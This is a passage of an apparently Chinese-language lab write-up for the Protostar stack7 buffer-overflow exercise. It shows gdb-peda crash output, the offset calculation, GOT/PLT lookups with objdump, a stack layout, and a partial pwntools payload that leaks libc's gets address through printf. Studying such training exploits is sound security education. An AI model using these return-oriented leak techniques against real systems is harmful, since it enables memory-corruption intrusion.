<span class="nl">Warning</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">set</span><span class="w"> </span><span class="n">logging</span><span class="w"> </span><span class="n">off</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">alias</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="err">&#39;</span><span class="n">set</span><span class="w"> </span><span class="n">logging</span><span class="w"> </span><span class="n">enabled</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">deprecated</span><span class="p">.</span>
<span class="n">Use</span><span class="w"> </span><span class="err">&#39;</span><span class="n">set</span><span class="w"> </span><span class="n">logging</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">off</span><span class="err">&#39;</span><span class="p">.</span>

<span class="nl">Warning</span><span class="p">:</span><span class="w"> </span><span class="err">&#39;</span><span class="n">set</span><span class="w"> </span><span class="n">logging</span><span class="w"> </span><span class="n">on</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">alias</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="err">&#39;</span><span class="n">set</span><span class="w"> </span><span class="n">logging</span><span class="w"> </span><span class="n">enabled</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">deprecated</span><span class="p">.</span>
<span class="n">Use</span><span class="w"> </span><span class="err">&#39;</span><span class="n">set</span><span class="w"> </span><span class="n">logging</span><span class="w"> </span><span class="n">enabled</span><span class="w"> </span><span class="n">on</span><span class="err">&#39;</span><span class="p">.</span>

<span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="nl">EAX</span><span class="p">:</span><span class="w"> </span><span class="mh">0x8048545</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span><span class="w"> </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span><span class="p">)</span>
<span class="nl">EBX</span><span class="p">:</span><span class="w"> </span><span class="mh">0xf7f95e14</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x232d0c</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;\</span><span class="n">x0c</span><span class="o">-</span><span class="err">#&#39;</span><span class="p">)</span>
<span class="nl">ECX</span><span class="p">:</span><span class="w"> </span><span class="mh">0x1dedde51</span><span class="w"> </span>
<span class="nl">EDX</span><span class="p">:</span><span class="w"> </span><span class="mh">0xffffcec0</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0xf7f95e14</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x232d0c</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;\</span><span class="n">x0c</span><span class="o">-</span><span class="err">#&#39;</span><span class="p">)</span>
<span class="nl">ESI</span><span class="p">:</span><span class="w"> </span><span class="mh">0x8048570</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">&gt;:</span><span class="w">      </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span><span class="p">)</span>
<span class="nl">EDI</span><span class="p">:</span><span class="w"> </span><span class="mh">0xf7ffcb60</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="nl">EBP</span><span class="p">:</span><span class="w"> </span><span class="mh">0xffffce98</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="nl">ESP</span><span class="p">:</span><span class="w"> </span><span class="mh">0xffffce90</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="nl">EIP</span><span class="p">:</span><span class="w"> </span><span class="mh">0x804854b</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span><span class="w">       </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80484c4</span><span class="w"> </span><span class="o">&lt;</span><span class="n">getpath</span><span class="o">&gt;</span><span class="p">)</span>
<span class="nl">EFLAGS</span><span class="p">:</span><span class="w"> </span><span class="mh">0x286</span><span class="w"> </span><span class="p">(</span><span class="n">carry</span><span class="w"> </span><span class="n">PARITY</span><span class="w"> </span><span class="n">adjust</span><span class="w"> </span><span class="n">zero</span><span class="w"> </span><span class="n">SIGN</span><span class="w"> </span><span class="n">trap</span><span class="w"> </span><span class="n">INTERRUPT</span><span class="w"> </span><span class="n">direction</span><span class="w"> </span><span class="n">overflow</span><span class="p">)</span>
<span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="w">   </span><span class="mh">0x8048545</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">&gt;:</span><span class="w">    </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span>
<span class="w">   </span><span class="mh">0x8048546</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">1</span><span class="o">&gt;:</span><span class="w">  </span><span class="n">mov</span><span class="w">    </span><span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>
<span class="w">   </span><span class="mh">0x8048548</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">3</span><span class="o">&gt;:</span><span class="w">  </span><span class="n">and</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0xfffffff0</span>
<span class="o">=&gt;</span><span class="w"> </span><span class="mh">0x804854b</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;:</span><span class="w">  </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80484c4</span><span class="w"> </span><span class="o">&lt;</span><span class="n">getpath</span><span class="o">&gt;</span>
<span class="w">   </span><span class="mh">0x8048550</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;:</span><span class="w"> </span><span class="n">mov</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="n">ebp</span>
<span class="w">   </span><span class="mh">0x8048552</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;:</span><span class="w"> </span><span class="n">pop</span><span class="w">    </span><span class="n">ebp</span>
<span class="w">   </span><span class="mh">0x8048553</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;:</span><span class="w"> </span><span class="n">ret</span>
<span class="w">   </span><span class="mh">0x8048554</span><span class="o">:</span><span class="w">   </span><span class="n">nop</span>
<span class="n">Guessed</span><span class="w"> </span><span class="n">arguments</span><span class="o">:</span>
<span class="n">arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">:</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="mo">0000</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffce90</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="mo">0004</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffce94</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="mo">000</span><span class="mi">8</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffce98</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="mo">0012</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffce9c</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0xf7d87cc3</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_start_call_main</span><span class="o">+</span><span class="mi">115</span><span class="o">&gt;:</span><span class="w">  </span><span class="n">add</span><span class="w">    </span><span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span><span class="p">)</span>
<span class="mo">0016</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffcea0</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x1</span><span class="w"> </span>
<span class="mo">0020</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffcea4</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0xffffcf54</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0xffffd147</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;/opt/protostar/bin/stack7&quot;</span><span class="p">)</span>
<span class="mo">0024</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffcea8</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0xffffcf5c</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0xffffd161</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;LESS_TERMCAP_se=</span><span class="se">\033</span><span class="s">[0m&quot;</span><span class="p">)</span>
<span class="mo">002</span><span class="mi">8</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffceac</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0xffffcec0</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0xf7f95e14</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x232d0c</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;\</span><span class="n">x0c</span><span class="o">-</span><span class="err">#&#39;</span><span class="p">)</span>
<span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
<span class="nl">Legend</span><span class="p">:</span><span class="w"> </span><span class="n">code</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">rodata</span><span class="p">,</span><span class="w"> </span><span class="n">value</span>

<span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="o">=</span><span class="mh">0x1</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="o">=</span><span class="mh">0xffffcf54</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">stack7</span><span class="o">/</span><span class="n">stack7</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">28</span>
<span class="nl">warning</span><span class="p">:</span><span class="w"> </span><span class="mi">28</span><span class="w">     </span><span class="n">stack7</span><span class="o">/</span><span class="n">stack7</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">directory</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">n</span>
<span class="n">input</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">please</span><span class="o">:</span><span class="w"> </span><span class="n">AAA</span><span class="o">%</span><span class="n">AAsAABAA$AAnAACAA</span><span class="o">-</span><span class="n">AA</span><span class="p">(</span><span class="n">AADAA</span><span class="p">;</span><span class="n">AA</span><span class="p">)</span><span class="n">AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span>
<span class="n">got</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">AAA</span><span class="o">%</span><span class="n">AAsAABAA$AAnAACAA</span><span class="o">-</span><span class="n">AA</span><span class="p">(</span><span class="n">AADAA</span><span class="p">;</span><span class="n">AA</span><span class="p">)</span><span class="n">AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span>

<span class="n">Program</span><span class="w"> </span><span class="n">received</span><span class="w"> </span><span class="n">signal</span><span class="w"> </span><span class="n">SIGSEGV</span><span class="p">,</span><span class="w"> </span><span class="n">Segmentation</span><span class="w"> </span><span class="n">fault</span><span class="p">.</span>
<span class="p">[</span><span class="o">----------------------------------</span><span class="n">registers</span><span class="o">-----------------------------------</span><span class="p">]</span>
<span class="nl">EAX</span><span class="p">:</span><span class="w"> </span><span class="mh">0x804a9c0</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAJAAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="nl">EBX</span><span class="p">:</span><span class="w"> </span><span class="mh">0xf7f95e14</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x232d0c</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;\</span><span class="n">x0c</span><span class="o">-</span><span class="err">#&#39;</span><span class="p">)</span>
<span class="nl">ECX</span><span class="p">:</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="nl">EDX</span><span class="p">:</span><span class="w"> </span><span class="mh">0x804aa89</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x79000000</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;&#39;</span><span class="p">)</span>
<span class="nl">ESI</span><span class="p">:</span><span class="w"> </span><span class="mh">0x8048570</span><span class="w"> </span><span class="p">(</span><span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">&gt;:</span><span class="w">      </span><span class="n">push</span><span class="w">   </span><span class="n">ebp</span><span class="p">)</span>
<span class="nl">EDI</span><span class="p">:</span><span class="w"> </span><span class="mh">0xf7ffcb60</span><span class="w"> </span><span class="o">--&gt;</span><span class="w"> </span><span class="mh">0x0</span><span class="w"> </span>
<span class="nl">EBP</span><span class="p">:</span><span class="w"> </span><span class="mh">0x41344141</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;</span><span class="n">AA4A</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nl">ESP</span><span class="p">:</span><span class="w"> </span><span class="mh">0xffffce90</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="nl">EIP</span><span class="p">:</span><span class="w"> </span><span class="mh">0x41414a41</span><span class="w"> </span><span class="p">(</span><span class="err">&#39;</span><span class="n">AJAA</span><span class="err">&#39;</span><span class="p">)</span>
<span class="nl">EFLAGS</span><span class="p">:</span><span class="w"> </span><span class="mh">0x10282</span><span class="w"> </span><span class="p">(</span><span class="n">carry</span><span class="w"> </span><span class="n">parity</span><span class="w"> </span><span class="n">adjust</span><span class="w"> </span><span class="n">zero</span><span class="w"> </span><span class="n">SIGN</span><span class="w"> </span><span class="n">trap</span><span class="w"> </span><span class="n">INTERRUPT</span><span class="w"> </span><span class="n">direction</span><span class="w"> </span><span class="n">overflow</span><span class="p">)</span>
<span class="p">[</span><span class="o">-------------------------------------</span><span class="n">code</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="n">Invalid</span><span class="w"> </span><span class="n">$PC</span><span class="w"> </span><span class="n">address</span><span class="o">:</span><span class="w"> </span><span class="mh">0x41414a41</span>
<span class="p">[</span><span class="o">------------------------------------</span><span class="n">stack</span><span class="o">-------------------------------------</span><span class="p">]</span>
<span class="mo">0000</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffce90</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;fAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="mo">0004</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffce94</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="mo">000</span><span class="mi">8</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffce98</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;AgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="mo">0012</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffce9c</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="mo">0016</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffcea0</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;AAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="mo">0020</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffcea4</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="mo">0024</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffcea8</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;MAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="mo">002</span><span class="mi">8</span><span class="o">|</span><span class="w"> </span><span class="mh">0xffffceac</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;</span><span class="p">)</span>
<span class="p">[</span><span class="o">------------------------------------------------------------------------------</span><span class="p">]</span>
<span class="nl">Legend</span><span class="p">:</span><span class="w"> </span><span class="n">code</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="p">,</span><span class="w"> </span><span class="n">rodata</span><span class="p">,</span><span class="w"> </span><span class="n">value</span>
<span class="n">Stopped</span><span class="w"> </span><span class="n">reason</span><span class="o">:</span><span class="w"> </span><span class="n">SIGSEGV</span>
<span class="mh">0x41414a41</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">??</span><span class="w"> </span><span class="p">()</span>
<span class="n">gdb</span><span class="o">-</span><span class="n">peda$</span><span class="w"> </span><span class="n">pattern_offset</span><span class="w"> </span><span class="mh">0x41414a41</span>
<span class="mi">1094797889</span><span class="w"> </span><span class="n">found</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">offset</span><span class="o">:</span><span class="w"> </span><span class="mi">80</span>
</code></pre></div>
<p><strong>泄漏libc函数地址（选择泄漏gets函数的地址）</strong></p>
<div class="highlight"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">R</span><span class="w"> </span><span class="n">stack7</span>

<span class="nl">stack7</span><span class="p">:</span><span class="w">     </span><span class="n">file</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>

<span class="n">DYNAMIC</span><span class="w"> </span><span class="n">RELOCATION</span><span class="w"> </span><span class="n">RECORDS</span>
<span class="n">OFFSET</span><span class="w">   </span><span class="n">TYPE</span><span class="w">              </span><span class="n">VALUE</span>
<span class="mi">08049738</span><span class="w"> </span><span class="n">R_386_GLOB_DAT</span><span class="w">    </span><span class="n">__gmon_start__</span>
<span class="mi">08049780</span><span class="w"> </span><span class="n">R_386_COPY</span><span class="w">        </span><span class="n">stdout</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
<span class="mi">08049748</span><span class="w"> </span><span class="n">R_386_JUMP_SLOT</span><span class="w">   </span><span class="n">__gmon_start__</span>
<span class="mi">0804974</span><span class="n">c</span><span class="w"> </span><span class="n">R_386_JUMP_SLOT</span><span class="w">   </span><span class="n">gets</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
<span class="mi">08049750</span><span class="w"> </span><span class="n">R_386_JUMP_SLOT</span><span class="w">   </span><span class="n">__libc_start_main</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
<span class="mi">08049754</span><span class="w"> </span><span class="n">R_386_JUMP_SLOT</span><span class="w">   </span><span class="n">_exit</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
<span class="mi">08049758</span><span class="w"> </span><span class="n">R_386_JUMP_SLOT</span><span class="w">   </span><span class="n">fflush</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
<span class="mi">0804975</span><span class="n">c</span><span class="w"> </span><span class="n">R_386_JUMP_SLOT</span><span class="w">   </span><span class="n">printf</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
<span class="mi">08049760</span><span class="w"> </span><span class="n">R_386_JUMP_SLOT</span><span class="w">   </span><span class="n">strdup</span><span class="err">@</span><span class="n">GLIBC_2</span><span class="mf">.0</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">stack7</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s">&quot;printf@plt&quot;</span>
<span class="mf">080483e4</span><span class="w"> </span><span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;:</span>
<span class="w"> </span><span class="mi">80484</span><span class="n">d2</span><span class="o">:</span><span class="w">       </span><span class="n">e8</span><span class="w"> </span><span class="mi">0</span><span class="n">d</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w">          </span><span class="n">call</span><span class="w">   </span><span class="mf">80483e4</span><span class="w"> </span><span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="w"> </span><span class="mi">8048513</span><span class="o">:</span><span class="w">       </span><span class="n">e8</span><span class="w"> </span><span class="n">cc</span><span class="w"> </span><span class="n">fe</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w">          </span><span class="n">call</span><span class="w">   </span><span class="mf">80483e4</span><span class="w"> </span><span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
<span class="w"> </span><span class="mi">8048533</span><span class="o">:</span><span class="w">       </span><span class="n">e8</span><span class="w"> </span><span class="n">ac</span><span class="w"> </span><span class="n">fe</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="n">ff</span><span class="w">          </span><span class="n">call</span><span class="w">   </span><span class="mf">80483e4</span><span class="w"> </span><span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="err">└─</span><span class="n">$</span><span class="w"> </span><span class="n">objdump</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">j</span><span class="w"> </span><span class="p">.</span><span class="n">rodata</span><span class="w"> </span><span class="n">stack7</span>


<span class="nl">stack7</span><span class="p">:</span><span class="w">     </span><span class="n">file</span><span class="w"> </span><span class="n">format</span><span class="w"> </span><span class="n">elf32</span><span class="o">-</span><span class="n">i386</span>

<span class="n">Contents</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">section</span><span class="w"> </span><span class="p">.</span><span class="n">rodata</span><span class="o">:</span>
<span class="w"> </span><span class="mi">8048618</span><span class="w"> </span><span class="mo">03000000</span><span class="w"> </span><span class="mo">01000200</span><span class="w"> </span><span class="mf">696e7075</span><span class="w"> </span><span class="mi">74207061</span><span class="w">  </span><span class="p">........</span><span class="n">input</span><span class="w"> </span><span class="n">pa</span>
<span class="w"> </span><span class="mi">8048628</span><span class="w"> </span><span class="mi">74682070</span><span class="w"> </span><span class="mi">6</span><span class="n">c656173</span><span class="w"> </span><span class="mi">653</span><span class="n">a2000</span><span class="w"> </span><span class="mi">627</span><span class="n">a7a7a</span><span class="w">  </span><span class="n">th</span><span class="w"> </span><span class="n">please</span><span class="o">:</span><span class="w"> </span><span class="p">.</span><span class="n">bzzz</span>
<span class="w"> </span><span class="mi">8048638</span><span class="w"> </span><span class="mi">74202825</span><span class="w"> </span><span class="mi">70290</span><span class="n">a00</span><span class="w"> </span><span class="mf">676f</span><span class="mi">7420</span><span class="w"> </span><span class="mi">70617468</span><span class="w">  </span><span class="n">t</span><span class="w"> </span><span class="p">(</span><span class="o">%</span><span class="n">p</span><span class="p">)..</span><span class="n">got</span><span class="w"> </span><span class="n">path</span>
<span class="w"> </span><span class="mi">8048648</span><span class="w"> </span><span class="mi">2025730</span><span class="n">a</span><span class="w"> </span><span class="mo">00</span><span class="w">                           </span><span class="o">%</span><span class="n">s</span><span class="p">..</span><span class="w">   </span>
</code></pre></div>
<div class="highlight"><pre><span></span><code><span class="n">地址信息如下</span><span class="err">：</span>
<span class="n">gets</span><span class="err">@</span><span class="n">GOT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0804974</span><span class="n">c</span>
<span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">080483e4</span>
<span class="s">&quot;%s&quot;</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">8048648</span>
<span class="n">main_addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">08048545</span>
</code></pre></div>
<p><strong>栈布局如下：</strong></p>
<div class="highlight"><pre><span></span><code>+------------------+
|   缓冲区填充     | 80 bytes
+------------------+
|   printf@plt     | 覆盖返回地址
+------------------+
|   main 地址      | printf 的返回地址
+------------------+
|   格式字符串地址 | printf 的第一个参数
+------------------+
|   gets GOT 地址  | printf 的第二个参数
+------------------+
</code></pre></div>
<p><strong>泄漏地址的代码如下：</strong></p>
<div class="highlight"><pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;/opt/protostar/bin/stack7&#39;</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">printf_plt</span> <span class="o">=</span> <span class="mh">0x080483e4</span>
<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x08048545</span>
<span class="n">gets_got</span> <span class="o">=</span> <span class="mh">0x0804974c</span>

<span class="c1"># 第一步：泄露 gets 地址</span>
<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="n">offset</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_plt</span><span class="p">)</span>      <span class="c1"># 返回到 printf</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span>        <span class="c1"># printf 返回后回到 main</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048648</span><span class="p">)</span>       <span class="c1"># 格式字符串 &quot; %s\n&quot;</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">gets_got</span><span class="p">)</span>         <span class="c1"># 要泄露的 GOT 地址</span>

